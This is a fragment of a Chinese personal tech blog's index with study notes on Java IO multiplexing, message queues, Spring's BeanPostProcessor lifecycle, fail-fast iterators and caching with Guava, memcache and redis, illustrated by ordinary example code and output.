【IO多路复用】和【多线程】是两种解决单个服务器应对多客户端同时IO请求阻塞问题的方案。 【多线程】：即针对每一个客户端进程都新建一个新的服务器端线程，即一对一地应付客户端的通信需求。 【IO多路复用】搞定了多线程解决方案的痛点，只用一个线程来解决阻塞问题，具体做法就是：依然调用一个阻塞方法，这个阻塞方法会监听跟踪每一个IO流的状态，当有一个新的数据传输请求到来，就会通知服务器，然后服务器找到对应有需求的客户端，并读取它要传输的数据。这样，就不用开一大堆线程去一对一的监听IO状态变化了。 io多路复用通过一种机制，可以监视多个文件描述符，一旦某个文件描述就绪，能够通知应用程序进行相应的io读写操作。 io多路复用解决了多线程io阻塞问题，避免创建很多线程，及降低线程上下文切换的开销，提升资源利用率。 自己的总结： 每一个用户连接都是一个socket,数据以tcp/udp的方式经过一层层的协议发送到目标服务器，目标服务器有多个channel在接受，这多个channel注册到一个selector上，专门一个线程来负责检测channel上是否有对应的事件发生，一旦有事件发生，那么selector将这些事件收集起来逐个去内核处理(数据准备，内核数据拷贝),一旦某一个socket的请求数据处理好了，立即返回。这一批都处理好了之后，select继续轮训channel看是否有新的事件需要处理。没有则会阻塞。这样做的好处是：只需要一个线程来处理多个socket，避免创建很多线程，及降低线程上下文切换的开销，提升资源利用率。]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13.高并发处理之消息队列思路]]></title>
    <url>%2F2018%2F07%2F21%2F13.%E9%AB%98%E5%B9%B6%E5%8F%91%E5%A4%84%E7%90%86%E4%B9%8B%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[这里对kafka以及rabbitMQ进行简单的介绍，提供一种应对高并发的解决思路。 消息队列特性 业务无关：只做消息分发 FIFO：先投递先到达 容灾：灾点的动态增删和消息的持久化 性能：吞吐量提升，系统内部通信效率提高 为什么要用消息队列 【生产】和【消费】的速度或稳定性等因素不一致 消息队列好处 业务解耦 最终一致性 记录和补偿：在做所有不确定的事情之前，先把事情先记录下来，然后去做不确定的事，他的结果通常分三种：成功，失败，不确定。不确定有超时等情况，可以等价为失败。如果成功，那就可以把记录的东西清理掉，对于失败和不确定，我们可以依赖定时任务把所有失败的事情再做一遍，直到成功为止。 比如银行转账，A转账给B，系统在A扣钱成功的情况下，需要给B通知的这件事记录在库里面，为了保证最高的可靠性，可以把通知B系统加钱和扣钱成功维护在一个本地事务里，通知成功，则删除这条记录，通知失败或者不确定，依靠定时任务补偿性地通知我们，直到我们把状态更新成正常为止。这里可能有消息重复问题，需要做好幂等操作。 广播 错峰和控流 数据库的处理能力有限，跟前端并发量不是一个数量级。这个时候用消息队列，在下游系统有能力处理的时候再去处理。 总结：消息队列可以处理对延迟不那么敏感的分布式场景。在上下游处理能力不对等的时候，在中间作为一个通信漏斗，在下游有能力处理的时候再去给他分发。同时，下游有很多系统关心你的系统发出的通知，果断用消息队列。 kafkaApache下的子项目，是一个高性能、跨语言、分布式、发布订阅的消息队列系统。 特性 快速持久化：在O(1)开销下进行消息持久化 高吞吐，10万每秒的吞吐速率 完全的分布式系统，他的broker,producer,consumer都原生自动支持分布式、支持负载均衡 broker:kafka集群包含一个或多个服务器，这些服务器就被称为broker topic:每条发布到kafka集群的消息，都有一个类别，就是topic,物理上不同topic的消息都是分开存储的 Partition:物理概念，每个topic都包含一个或多个Partition producer：发布消息 consumer：读取消息 consumer group：每个consumer都属于一个group，这个group name可以指定，如果不指定，就属于默认的group producer根据Partition的算法，将消息发布到指定的Partition里，kafka集群接受到producer发来的消息之后，将其持久化到硬盘，并保留消息指定时长，consumer从kafka集群获取数据，并控制消息的offset,kafka维护的数据只是offset，consumer每消费一个消息的时候，这个offset就要加一，消息的状态由consumer来控制，consumer可以跟踪和重设offset的值，consumer就可以读取任一位置的消息了。 rabbitMQ先传到Exchange，然后再传到Queue，Exchange必须知道如何处理接收到的消息：是发送给一个特定的queue？还是发送到许多queue？还是抛弃？规则是由ExchangeType来规定，自己设定。 Exchange可以发送到很多queue，通过routingKey来进行绑定。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13.BeanPostProcessor-后置处理器]]></title>
    <url>%2F2018%2F07%2F21%2F13.BeanPostProcessor-%E5%90%8E%E7%BD%AE%E5%A4%84%E7%90%86%E5%99%A8%2F</url>
    <content type="text"><![CDATA[学习bean的初始化和销毁等。 BeanPostProcessor-后置处理器这是一个接口，bean的后置处理器，在bean初始化前后进行一些处理工作，有两个方法，一个是初始化之前处理，一个是初始化之后处理。 具体的执行时机： postProcessBeforeInitialization是在bean实例生成之后，在任何的初始化方法之前（比如InitializingBean接口的afterPropertiesSet方法；比如init-method方法） postProcessAfterInitialization与上面个完全相反，在任何的初始化方法完成之后再调用。 12345public interface BeanPostProcessor &#123; Object postProcessBeforeInitialization(Object var1, String var2) throws BeansException; Object postProcessAfterInitialization(Object var1, String var2) throws BeansException;&#125; 示例： 我这里将上面的Dog，Cat，Pig全部用起来。pig用到init-destory和destory-method方法；cat实现InitializingBean,DisposableBean这两个接口；pig是实现@PostConstruct和@PreDestory这两个接口。 再加上后置处理器： 12345678910111213141516171819202122@Componentpublic class MyBeanPostProcessor implements BeanPostProcessor&#123; /** * * @param bean 还未初始化的bean对象 * @param beanName 这个bean对象在容器中的名字 * @return 返回我们要用的bean实例对象，可以直接返回传进来的bean，也可以包装一下再返回 * @throws BeansException */ @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123; System.out.println("postProcessBeforeInitialization..."+beanName+"=&gt;"+bean); return bean;//返回null的话，下面个方法就不会再执行了 &#125; @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123; System.out.println("postProcessAfterInitialization..."+beanName+"=&gt;"+bean); return bean; &#125;&#125; 对于Dog是用的是注解版的@Bean(initMethod = &quot;init&quot;,destroyMethod = &quot;destory&quot;)：123456789101112public class Dog &#123; public Dog()&#123; System.out.println("Dog constructor...."); &#125; public void init()&#123; System.out.println("Dog init..."); &#125; public void destory()&#123; System.out.println("Dog destory..."); &#125;&#125; 对于Cat用的是InitializingBean,DisposableBean:123456789101112131415public class Cat implements InitializingBean,DisposableBean&#123; public Cat()&#123; System.out.println("cat constructor..."); &#125; @Override public void destroy() throws Exception &#123; System.out.println("cat destory..."); &#125; @Override public void afterPropertiesSet() throws Exception &#123; System.out.println("cat afterPropertiesSet init..."); &#125;&#125; 对于Pig用的是123456789101112131415public class Pig&#123; public Pig()&#123; System.out.println("pig constructor..."); &#125; @PostConstruct public void init()&#123; System.out.println("pig init..."); &#125; @PreDestroy public void destory()&#123; System.out.println("pig destory..."); &#125;&#125; 一起启动，看看是什么先后顺序： 1234567891011121314151617181920212223242526//1.首先是Dog对象创建//2.然后是在任何的初始化方法之前执行postProcessBeforeInitialization//3.然后初始化init//4.init初始化之后执行postProcessAfterInitializationDog constructor....postProcessBeforeInitialization...dog=&gt;com.swg.bean.Dog@157632c9Dog init...postProcessAfterInitialization...dog=&gt;com.swg.bean.Dog@157632c9//同理cat constructor...postProcessBeforeInitialization...cat=&gt;com.swg.bean.Cat@64c87930cat afterPropertiesSet init...postProcessAfterInitialization...cat=&gt;com.swg.bean.Cat@64c87930//同理pig constructor...postProcessBeforeInitialization...pig=&gt;com.swg.bean.Pig@4de5031fpig init...postProcessAfterInitialization...pig=&gt;com.swg.bean.Pig@4de5031f容器已经启动成功...五月 28, 2018 4:29:27 下午 org.springframework.context.annotation.AnnotationConfigApplicationContext doClose信息: Closing org.springframework.context.annotation.AnnotationConfigApplicationContext@16f65612: startup date [Mon May 28 16:29:26 CST 2018]; root of context hierarchypig destory...cat destory...Dog destory... 结合上面的执行初始化和销毁顺序，总结为下面的一张图： BeanPostProcessor原理首先是创建IOC容器： 1AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfLifeCycle.class); 进去之后是构造器： 12345public AnnotationConfigApplicationContext(Class... annotatedClasses) &#123; this(); this.register(annotatedClasses); this.refresh();//刷新IOC容器&#125; 这个refresh方法中有finishBeanFactoryInitialization这个方法： 12//初始化剩下的所有非懒记载的单例beanthis.finishBeanFactoryInitialization(beanFactory); finishBeanFactoryInitialization这个方法中有一个方法是：12//真正初始化剩下的所有非懒记载的单例beanbeanFactory.preInstantiateSingletons(); 下面就是获取bean，获取不到就创建对象。 上面已经完成了对象的创建。下面就是进行属性赋值和初始化工作。123456781、赋值先执行populateBean方法，是对bean进行属性赋值2、初始化//遍历得到容器中所有的BeanPostProcessor：挨个执行beforeInitialization,一旦返回null，后置处理器就不会再执行applyBeanPostProcessorsBeforeInitialization//初始化之前处理invokeInitMethods：执行初始化方法applyBeanPostProcessorsAfterInitialization//初始化之后处理 BeanPostProcessor在spring底层的使用@Autowired这个注解底层就是BeanPostProcessor实现的 总结 执行初始化和销毁方法 通过@Bean指定init-destory和destory-method方法 通过让Bean实现InitializingBean（定义初始化逻辑）,DisposableBean（定义销毁前的逻辑） 通过使用JSR250规范中的@PostConstruct和@PreDestory来进行初始化工作和销毁之前的工作 BeanPostProcessor：bean的后置处理器，在bean初始化前后进行一些处理工作]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[12、深入fail-fast]]></title>
    <url>%2F2018%2F07%2F21%2F12%E3%80%81%E6%B7%B1%E5%85%A5fail-fast%2F</url>
    <content type="text"><![CDATA[本文分析fail-fast机制. 一、什么是fail-fast由iterator()和listIterator()返回的迭代器是fail-fast的。在于程序在对list进行迭代时，某个线程对该collection在结构上对其做了修改，这时迭代器就会抛出ConcurrentModificationException异常信息。因此，面对并发的修改，迭代器快速而干净利落地失败，而不是在不确定的情况下冒险。由elements()返回的Enumerations不是fail-fast的。需要注意的是，迭代器的fail-fast并不能得到保证，它不能够保证一定出现该错误。一般来说，fail-fast会尽最大努力抛出ConcurrentModificationException异常。因此，为提高此类操作的正确性而编写一个依赖于此异常的程序是错误的做法，正确做法是：ConcurrentModificationException 应该仅用于检测 bug。 大意为在遍历一个集合时，当集合结构被修改，很有可能会抛出Concurrent Modification Exception。为什么说是很有可能呢？从下文中我们可以知道，迭代器的remove操作（注意是迭代器的remove方法而不是集合的remove方法）修改集合结构就不会导致这个异常。 看到这里我们就明白了，fail-fast 机制是java容器（Collection和Map都存在fail-fast机制）中的一种错误机制。在遍历一个容器对象时，当容器结构被修改，很有可能会抛出ConcurrentModificationException，产生fail-fast。 二、什么时候会出现fail-fast以及解决思路在以下两种情况下会导致fail-fast，抛出ConcurrentModificationException 单线程环境 遍历一个集合过程中，集合结构被修改。注意，listIterator.remove()方法修改集合结构不会抛出这个异常。 这里就提示了单线程下在更改容器(add, delete….)，那么迭代的时候采用iterator.remove()方法可以确保迭代器在查找next的时候，指针不会丢失。 多线程环境 当一个线程遍历集合过程中，而另一个线程对集合结构进行了修改。 如果当前有多个线程在对容器进行操作，例如一个线程正在向容器中写数据，而另一个线程在迭代此容器，这时候就必须考虑并发下的线程安全问题。ConcurrentModificationException官方文档第一句就指出： This exception may be thrown by methods that have detected concurrent modification of an object when such modification is not permissible. 这时候可以采用java.util.concurrent包下面的线程安全的容器解决此异常。 三、关于listIterator补充Java的Iterator的只能单向移动。 ListIterator是一个更加强大的Iterator的子类型。它只能用于各种List类的访问。它最大的优点是可以双向移动。它还可以产生相对于迭代器在列表中指向的当前位置的前一个和后一个元素的索引，并且可以使用set()方法替换它访问过的最后一个元素。 ListIterator只能用于List，Iterator是通用的 Iterator容易引起并发修改异常问题，而ListIterator可以避免线程安全问题的发生，因为其有内置的add()等修改集合的方法。 示例12345678910111213141516171819202122232425262728public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList(); list.add("0"); list.add("1"); list.add("2"); list.add("3"); ListIterator&lt;String&gt; iterator = list.listIterator(); System.out.println("--------------------向下遍历--------------------"); while (iterator.hasNext()) &#123; int nextIndex = iterator.nextIndex(); String next = (String) iterator.next(); System.out.println("当前元素："+next+"，当前元素索引："+nextIndex); &#125; System.out.println("--------------------向上遍历--------------------"); while (iterator.hasPrevious()) &#123; int previousIndex = iterator.previousIndex(); String previous = (String) iterator.previous(); System.out.println("当前元素："+previous+"，当前元素索引："+previousIndex); &#125; System.out.println("-----------测试set()和listIterator(n)----------"); System.out.println(list); iterator = list.listIterator(3); while(iterator.hasNext())&#123; iterator.next(); iterator.set("5"); &#125; System.out.println(list);&#125; 输出结果： ——————–向下遍历——————– 当前元素：0，当前元素索引：0 当前元素：1，当前元素索引：1 当前元素：2，当前元素索引：2 当前元素：3，当前元素索引：3 ——————–向上遍历——————– 当前元素：3，当前元素索引：3 当前元素：2，当前元素索引：2 当前元素：1，当前元素索引：1 当前元素：0，当前元素索引：0 ———–测试set()和listIterator(n)———- [0, 1, 2, 3] [0, 1, 2, 5] 对于最后几行代码有一些小疑惑，发现是我对于迭代的next()和hasNext()方法还是有一些误区，下面的解释让我豁然开朗： 关于Iterator主要有三个方法：hasNext()、next()、remove() hasNext:没有指针下移操作，只是判断是否存在下一个元素 next：指针下移，返回该指针所指向的元素 remove：删除当前指针所指向的元素，一般和next方法一起用，这时候的作用就是删除next方法返回的元素 当创建完成指向某个集合或者容器的Iterator对象时，这是的指针其实指向的是第一个元素的上方，即指向一个空 当调用hasNext方法的时候，只是判断下一个元素的有无，并不移动指针 当调用next方法的时候，向下移动指针，并且返回指针指向的元素，如果指针指向的内存中没有元素，会报异常。 remove方法删除的元素是指针指向的元素。如果当前指针指向的内存中没有元素，那么会抛出异常。 验证一下上面个图，仍然借用上面的一个程序，增加下面几句查看结果： 12345iterator = list.listIterator();//指向开始,即0的前一个位置，效果同list.listIterator(0);System.out.println(iterator.nextIndex());//0,即下一个索引为0,指针和hasNext()方法一样不移动System.out.println(iterator.next());//0,即下一个索引位置0的元素是0,指针后移一个System.out.println(iterator.nextIndex());//1,即下一个索引为1System.out.println(iterator.next());//1,即下一个索引位置1的元素是1,指针后移一个 12345iterator = list.listIterator(1);//指向开始1前面一个System.out.println(iterator.nextIndex());//1,即下一个索引为1,指针和hasNext()方法一样不移动System.out.println(iterator.next());//1,即下一个索引位置1的元素是1System.out.println(iterator.nextIndex());//2,即下一个索引为2System.out.println(iterator.next());//2,下一个索引位置2的元素是2 12345iterator = list.listIterator(3);//指向开始3前面一个System.out.println(iterator.nextIndex());//3,即下一个索引为3,指针和hasNext()方法一样不移动System.out.println(iterator.next());//3,即下一个索引位置3的元素是3System.out.println(iterator.nextIndex());//4,即下一个索引为4System.out.println(iterator.next());//java.util.NoSuchElementException 那么执行iterator = list.listIterator(3);这一句时，其实指针仍然是指向索引为3的前一个元素2的，只有下面执行next()了之后才会读取到3。 总结一下就是，list.listIterator(n)代表此时指针指向的是n-1，只有next()后会指向n。remove之前一定要查询一下元素，因为remove（注意是迭代器的remove方法而不是集合的remove方法）的是从列表中删除next()或previous()返回的最后一个元素。 上面穿插了一下迭代器的原理。 四、单线程环境例子1234567891011121314151617181920212223242526272829303132333435363738public static void main(String[] args) &#123; try&#123; ItrRemoveTest01(); System.out.println("============"); ItrRemoveTest02(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125;&#125;public static void ItrRemoveTest01() &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add("1"); list.add("2"); list.add("3"); ListIterator&lt;String&gt; itr = list.listIterator(); while (itr.hasNext()) &#123; System.out.println(itr.next()); //迭代器的remove方法修改集合结构 //在遍历的同时删除元素,避免ConcurrentModificationException itr.remove();//itr.add("aaa")也不报错 &#125; System.out.println("--list长度为--"+list.size());&#125;public static void ItrRemoveTest02() &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add("1"); list.add("2"); list.add("3"); ListIterator&lt;String&gt; itr = list.listIterator(); while (itr.hasNext()) &#123; System.out.println(itr.next());//1 //迭代器的remove方法修改集合结构 //抛出ConcurrentModificationException list.remove("2");//list.add("aaa")也报错 &#125;&#125; 输出结果是： 1 2 3 –list长度为–0 ============ 1 java.util.ConcurrentModificationException 说明： ItrRemoveTest01循环遍历list中所有元素，并且逐一删除。所以最后打印出长度为0，这种删除是不会报出异常，因为如果当前单个线程在更改容器(add, delete….)，那么迭代的时候采用iterator.remove()方法可以确保迭代器在查找next的时候，指针不会丢失；ItrRemoveTest02用了集合的remove方法，也就是更改Collection（容器）的内容，那么Iterator就会抛出ConcurrentModificationException。 五、多线程环境例子12345678910111213141516171819202122232425262728293031323334353637383940414243private static List&lt;String&gt; list = new Vector&lt;String&gt;();public static void main(String[] args) &#123; list.add("1"); list.add("2"); list.add("3"); // 同时启动两个线程对list进行操作！ new ErgodicThread().start(); new ModifyThread().start();&#125;/** * 遍历集合的线程 */private static class ErgodicThread extends Thread &#123; public void run() &#123; int i = 0; while (i &lt; 10) &#123; printAll(); i++; &#125; &#125;&#125;/** * 修改集合的线程 */private static class ModifyThread extends Thread &#123; public void run() &#123; list.add(String.valueOf("5")); &#125;&#125;/** * 遍历集合 */private static void printAll() &#123; Iterator iter = list.iterator(); while (iter.hasNext()) &#123; System.out.print((String) iter.next() + ", "); &#125; System.out.println();&#125; 启动之后报错： 1, Exception in thread “Thread-0” java.util.ConcurrentModificationException 从结果中可以看出当一个线程遍历集合，而另一个线程对这个集合的结构进行了修改，确实有可能触发ConcurrentModificationException异常。 六、fail-fast实现原理下面是Vector中迭代器Itr的部分源码： 1234567891011121314151617181920212223242526272829private class Itr implements Iterator&lt;E&gt; &#123; int expectedModCount = modCount; //省略的部分代码 public void remove() &#123; if (lastRet == -1) throw new IllegalStateException(); synchronized (Vector.this) &#123; checkForComodification(); Vector.this.remove(lastRet); expectedModCount = modCount; &#125; cursor = lastRet; lastRet = -1; &#125; @Override public void forEachRemaining(Consumer&lt;? super E&gt; action) &#123; //省略的部分代码 checkForComodification(); &#125; &#125; final void checkForComodification() &#123; if (modCount != expectedModCount) throw new ConcurrentModificationException(); &#125;&#125; 从代码中可以看到，每次初始化一个迭代器都会执行int expectedModCount = modCount;。modcount意为moderate count，即修改次数，对集合内容的修改都将增大这个值，如modCount++;。在迭代器初始化过程中会执行int expectedModCount = modCount;来记录迭会通过checkForComodification()方法判断modCount和expectedModCount 是否相等，如果不相等就表示已经有线程修改了集合结构。 使用迭代器的remove()方法修改集合结构不会触发ConcurrentModificationException，现在可以在源码中看出来是为什么。在remove()方法的最后会执行expectedModCount = modCount;，这样itr.remove操作后modCount和expectedModCount依然相等，就不会触发ConcurrentModificationException了。 七、如何避免fail-fast使用java.util.concurrent包下的类去取代java.util包下的类。 123456789101112131415161718public static void main(String[] args) &#123; try &#123; List list = new CopyOnWriteArrayList&lt;&gt;(); list.add("1"); list.add("2"); list.add("3"); ListIterator itr = list.listIterator(); while (itr.hasNext()) &#123; System.out.println(itr.next()); list.add("5"); list.remove("2"); &#125; System.out.println(list.toString()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 输出结果： 1 2 3 [1, 3, 5, 5, 5] 从运行结果中不难发现，在遍历过程中，使用支持并发集合的remove()方法修改集合结构并没有产生ConcurrentModificationException。]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[12.高并发处理之缓存思路]]></title>
    <url>%2F2018%2F07%2F21%2F12.%E9%AB%98%E5%B9%B6%E5%8F%91%E5%A4%84%E7%90%86%E4%B9%8B%E7%BC%93%E5%AD%98%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[这里对Guava Cache,Memcache以及redis进行简单介绍和对比。 1. 高并发处理思路与手段1.1 扩容 垂直扩容（纵向扩展）：提高系统部件能力 水平扩容（横向扩容）：增加更多系统成员来实现 1.2 数据库 读操作扩展：memcache,redis,CDN 写操作扩展：Cassandra,Hbase等 2. 高并发之缓存思路缓存特征命中率、最大元素、清空策略(FIFO,LFU,LRU,过期时间，随机) 影响缓存命中率因素： 业务场景和业务需求：适合读多写少的场景 缓存的设计(粒度和策略)：缓存粒度越小，命中率越高 缓存容量(经常用LRU)和基础设施(是否可扩展，避免缓存失效-一致性hash算法和几点冗余) 缓存分类 本地缓存：编程实现（成员变量、局部变量、静态变量）、Guava Cache 分布式缓存：Memcache，Redis 本地缓存：个应用之间无法很好地共享，与应用本身耦合过紧；而分布式缓存，本身就是独立的应用，各独立应用之间共享缓存。 2.1 Guava Cache 设计思想类似于jdk1.7中的ConcurrentHashMap，也是用多个segments的细粒度锁，在保证线程安全的同时，支持高并发场景的需求。 下面数据存储就是以键值对的形式存储，另外，需要处理缓存过期、动态加载等算法逻辑，所以需要一些额外的信息来实现这些操作。 主要实现的功能有：自动将节点加入到缓存结构中，当缓存的数据超过设置的最大值时，用LRU算法来移除。他具备根据节点上次被访问或者写入的时间来计算他的过期机制。 2.2 memcachememcache简单认识memcache是一个高性能的分布式的内存对象缓存系统，它在内存里维护一个统一的巨大的hash表。能用来缓存各种格式的数据，包括图像、视频、文件以及数据库检索等结果. memcache是以守护程序方式运行于一个或多个服务器中，随时会接收客户的连接和操作。 存在memcache中的对象实际放置在内存中，这也是memcache如此高效的原因。 本身是不提供分布式的解决方案的。分布式是在客户端实现的，通过客户端的路由来处理达到分布式的目的。 应用服务器每次在存储某个key和value的时候，通过某种算法把key映射到某台服务器上。 一致性hash算法客户端实现分布式：一致性hash算法。 memcache一些特性 Memcached单进程在32位系统中最大使用内存为2G，若在64位系统则没有限制,这是由于32位系统限制单进程最多可使用2G内存,要使用更多内存，可以分多个端口开启多个Memcached进程。 最大30天的数据过期时间，设置为永久也会在这个时间过期。最长键长为250字节，大于该长度无法存储。最大同时连接数是200; memcache是一种无阻塞的socket通信方式服务，基于libevent库，犹豫无阻塞通信，对内存读写速度非常快。 不适用memcached的业务场景？ 缓存对象的大小大于1MB 虚拟主机不让运行memcached服务 key的长度大于250字符 需要持久化 不能够遍历memcached中所有的item？ 这个操作的速度相对缓慢且阻塞其他的操作 memcache如何分配内存？这张图片里面涉及了slab_class、slab、page、chunk四个概念，它们之间的关系是： MemCache将内存空间分为一组slab 每个slab下又有若干个page，每个page默认是1M，如果一个slab占用100M内存的话，那么这个slab下应该有100个page 每个page里面包含一组chunk，chunk是真正存放数据的地方，同一个slab里面的chunk的大小是固定的 有相同大小chunk的slab被组织在一起，称为slab_class 那么是具体如何分配的呢？ MemCache中的value过来存放的地方是由value的大小决定的，value总是会被存放到与chunk大小最接近的一个slab中，比如slab[1]的chunk大小为80字节、slab[2]的chunk大小为100字节、slab[3]的chunk大小为128字节（相邻slab内的chunk基本以1.25为比例进行增长，MemCache启动时可以用-f指定这个比例），那么过来一个88字节的value，这个value将被放到2号slab中。 放slab的时候，首先slab要申请内存，申请内存是以page为单位的，所以在放入第一个数据的时候，无论大小为多少，都会有1M大小的page被分配给该slab。申请到page后，slab会将这个page的内存按chunk的大小进行切分，这样就变成了一个chunk数组，最后从这个chunk数组中选择一个用于存储数据。 如果这个slab中没有chunk可以分配了怎么办，如果MemCache启动没有追加-M（禁止LRU，这种情况下内存不够会报Out Of Memory错误），那么MemCache会把这个slab中最近最少使用的chunk中的数据清理掉，然后放上最新的数据。 MemCache的内存分配chunk里面会有内存浪费，88字节的value分配在128字节（紧接着大的用）的chunk中，就损失了30字节，但是这也避免了管理内存碎片的问题 MemCache的LRU算法不是针对全局的，是针对slab的 该可以理解为什么MemCache存放的value大小是限制的，因为一个新数据过来，slab会先以page为单位申请一块内存，申请的内存最多就只有1M，所以value大小自然不能大于1M了 最后再总结一下memcache MemCache中可以保存的item数据量是没有限制的，只要内存足够 MemCache单进程在32位机中最大使用内存为2G，64位机则没有限制 Key最大为250个字节，超过该长度无法存储 单个item最大数据是1MB，超过1MB的数据不予存储 MemCache服务端是不安全的，比如已知某个MemCache节点，可以直接telnet过去，并通过flush_all让已经存在的键值对立即失效 不能够遍历MemCache中所有的item，因为这个操作的速度相对缓慢且会阻塞其他的操作 MemCache的高性能源自于两阶段哈希结构：第一阶段在客户端，通过Hash算法根据Key值算出一个节点；第二阶段在服务端，通过一个内部的Hash算法，查找真正的item并返回给客户端。从实现的角度看，MemCache是一个非阻塞的、基于事件的服务器程序 MemCache设置添加某一个Key值的时候，传入expire为0表示这个Key值永久有效，这个Key值也会在30天之后失效 2.3 redisredis特点： 支持数据持久化，可以将内存中的数据保存到磁盘。 支持更多的数据结构 支持数据备份 性能极高，读可以达到11万次每秒；写达到8万1千次每秒 redis所有操作都是原子性，并且支持几个操作一起的原子性 支持发布-订阅功能 redis适用场景： 取最新n个数据、排行榜 精准过期时间 计数器 唯一性检查 实时系统、垃圾系统、缓存等 2.4 redis VS memcache当提到redis就问memcache，当提到memcache就提到redis，说明这两者用的都十分广泛，redis号称“强化版memcached”，他们之间的区别到底是啥呢？ 基本命令 memcache支持的命令很少，因为他只支持String的操作，通讯协议包括文本格式和二进制格式，用于满足简单网络客户端工具（如telnet）和对性能要求更高的客户端的不同需求；redis操作类似，只是数据结构更复杂以支持更多的特性，如发布订阅、消息队列等。redis的客户端-服务器通讯协议完全采用文本格式(在将来可能的服务器间通讯会采用二进制格式)。 事务 redis通过multi / watch / exec等命令可以支持事务的概念，原子性的执行一批命令; memcache:即使在多线程模式，所有的命令都是原子的；命令序列不是原子的。在并发的情况下，您也可能覆写了一个被其他进程set的item。memcached 1.2.5以及更高版本，提供了gets和cas命令，它们可以解决上面的问题。如果您使用gets命令查询某个key的item，memcached会给您返回该item当前值的唯一标识。如果您覆写了这个item并想把它写回到memcached中，您可以通过cas命令把那个唯一标识一起发送给 memcached。如果该item存放在memcached中的唯一标识与您提供的一致，您的写操作将会成功。如果另一个进程在这期间也修改了这个 item，那么该item存放在memcached中的唯一标识将会改变，您的写操作就会失败。 数据备份，有效性，持久化等 memcached不保证存储的数据的有效性，slab内部基于LRU也会自动淘汰旧数据;memcached也不做数据的持久化工作; redis可以以master-slave的方式配置服务器，slave节点对数据进行replica备份，slave节点也可以充当read only的节点分担数据读取的工作;redis内建支持两种持久化方案，snapshot快照和AOF增量Log方式。 性能 memcached自身并不主动定期检查和标记哪些数据需要被淘汰，只有当再次读取相关数据时才检查时间戳，或者当内存不够使用需要主动淘汰数据时进一步检查LRU数据。 redis为了减少大量小数据CMD操作的网络通讯时间开销 RTT (Round Trip Time)，支持pipeline和script技术。 集群 memcached的服务器端互相完全独立，客户端通常通过对键值应用hash算法决定数据的分区，为了减少服务器的增减对hash结果的影响，导致大面积的缓存失效，多数客户端实现了一致性hash算法。 redis3.0已经支持服务端集群了。 性能对比 由于redis只使用单核，而memcached可以使用多核，所以平均每一个核上redis在存储小数据时比memcached性能更高。而在100k以上的数据中，memcached性能要高于redis，虽然redis最近也在存储大数据的性能上进行优化，但是比起memcached，还是稍有逊色 内存使用效率 使用简单的key-value存储的话，memcached的内存利用率更高，而如果redis采用hash结构来做key-value存储，由于其组合式的压缩，其内存利用率会高于memcached。另外，memcached使用预分配的内存池的方式，带来一定程度的空间浪费 并且在内存仍然有很大空间时，新的数据也可能会被剔除，而redis使用现场申请内存的方式来存储数据，不会剔除任何非临时数据 redis更适合作为存储而不是cache。 redis支持服务器端的数据操作 redis相比memcached来说，拥有更多的数据结构和并支持更丰富的数据操作，通常在memcached里，你需要将数据拿到客户端来进行类似的修改再set回去。这大大增加了网络IO的次数和数据体积。在redis中，这些复杂的操作通常和一般的GET/SET一样高效。所以，如果需要缓存能够支持更复杂的结构和操作，那么redis会是不错的选择 何时应该使用memcache: 首先就是对小型静态数据进行缓存处理，最具代表性的例子就是HTML代码片段。这是因为memcached在处理元数据时所消耗的内存资源相对更少. 在以前，redis3.0版本之前，memcached在横向扩展方面也比redis更具优势。由于其在设计上的思路倾向以及相对更为简单的功能设置，memcached在实现扩展时的难度比redis低得多。 何时应该使用redis： 其他场景都可以用redis来替换。 相比于武断的LRU(即最低近期使用量)算法，redis允许用户更为精准地进行细化控制，利用六种不同回收策略确切提高缓存资源的实际利用率。redis还采用更为复杂的内存管理与回收对象备选方案。 memcached将键名限制在250字节，值也被限制在不超过1MB，且只适用于普通字符串。redis则将键名与值的最大上限各自设定为512MB，且支持二进制格式。 它所保存的数据具备透明化特性，也就是说服务器能够直接对这些数据进行操作. redis还提供可选而且能够具体调整的数据持久性方案 redis能够提供复制功能。复制功能旨在帮助缓存体系实现高可用性配置方案，从而在遭遇故障的情况下继续为应用程序提供不间断的缓存服务。 使用redis的正确姿势： 要进行master-slave配置，出现服务故障时可以支持切换。 在master侧禁用数据持久化，只需在slave上配置数据持久化。 物理内存+虚拟内存不足，这个时候dump一直死着，时间久了机器挂掉。这个情况就是灾难。 当redis物理内存使用超过内存总容量的3/5时就会开始比较危险了，就开始做swap,内存碎片大。 当达到最大内存时，会清空带有过期时间的key，即使key未到过期时间。 redis与DB同步写的问题，先写DB，后写redis，因为写内存基本上没有问题。 2.5 缓存数据的一致性 这个话题是比较重要的话题，在独立的章节中继续讨论。可以先简单看看：https://hacpai.com/article/1520822628400 2.6 缓存穿透对于缓存穿透概念的误解：由于缓存故障或者缓存过期，导致大量的请求穿透到后端数据库服务器； 其实他真正是：在高并发场景下，如果某个key被高并发地访问，却没有被命中，处于对容错性的考虑，会尝试从后端数据库取获取，从而导致大量的请求打到了数据库。 缓存穿透解决：缓存空对象；布隆过滤器 2.7 缓存雪崩由于缓存故障或者缓存过期，导致大量的请求穿透到后端数据库服务器.导致系统崩溃。 并发、缓存穿透、缓存抖动都有可能导致缓存雪崩问题。某个时间点，系统缓存集中失效：对缓存设置不同的过期时间。从应用架构角度看，可以限流、降级、熔断来降低影响，也可以通过多级缓存避免灾难。一开始要多进行压力测试，避免隐患。 关于缓存穿透和缓存雪崩，之redis系统学习中提及到了。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
